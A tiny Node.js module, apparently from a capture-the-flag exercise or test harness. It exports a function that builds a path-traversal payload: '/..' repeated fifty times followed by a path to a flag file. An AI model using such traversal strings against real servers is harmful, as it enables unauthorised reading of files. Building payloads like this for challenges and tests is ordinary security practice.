const path = require('path');  // Import the path module

function getPayload() {
  const pathToFlag = process.env.PATH_TO_FLAG || path.resolve(__dirname, "../flag.html");
  return "/..".repeat(50) + pathToFlag;
}

module.exports = { getPayload };